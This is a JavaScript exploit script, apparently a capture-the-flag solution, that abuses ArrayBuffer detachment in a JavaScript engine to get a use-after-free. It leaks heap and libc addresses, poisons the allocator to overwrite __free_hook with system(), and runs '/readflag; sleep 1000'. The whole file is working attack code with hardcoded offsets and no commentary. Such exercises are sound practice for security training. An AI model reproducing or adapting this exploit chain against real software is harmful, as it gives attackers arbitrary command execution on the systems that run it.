function free(buf)
{
	%ArrayBufferDetach(buf.buffer);
}

function u64(buf)
{
	let x = BigInt(0);
	for(i=0;i<8;++i)
		x += BigInt(buf[i]) << BigInt(i*8);
	return x;
}

function malloc(contents)
{
	let x = {};
	for(i=0;i<contents.length;++i)
		x[i] = contents[i];
	x.length = contents.length;
	return new Uint8Array(x);
}

function p64(addr)
{
	let x = new Uint8Array(8);
	for(i=0;i<8;++i)
	{
		x[i] = Number(addr & 0xffn);
		addr >>= 0x8n;
	}
	return x;
}

function calloc(size)
{
	return new Uint8Array(size);
}

let a = new Uint8Array(0x1000);
let b = new Uint8Array(0x440);
let c = new Uint8Array(0x440);

free(b);
free(c);
a.set(c);

let heap_leak = u64(a.slice(0,8));
let libc_leak = u64(a.slice(8,16)) - 0x3ebca0n; // - 0x1b9ca0n;
let free_hook = libc_leak + 0x3ed8e8n; //+0x1bc5a8n;
console.log("Heap leak: 0x"+heap_leak.toString(16));
console.log("Libc leak: 0x"+libc_leak.toString(16));
console.log("__free_hook: 0x"+free_hook.toString(16))

let c1 = calloc(0x80);
free(c1);
c1.set(p64(free_hook));

system = libc_leak + 0x4f440n;//+ 0x46ff0n;
f = new Array(0x80).fill(0);
for (i=0;i<8;++i)
{
	f[i] = Number(system & 0xffn);
	system >>= 8n;
}
malloc(f);

let _cmd = calloc(0x100);
cmd = "/readflag; sleep 1000"
for(i=0;i<cmd.length;++i)
	_cmd[i] = cmd.charCodeAt(i);
free(_cmd);
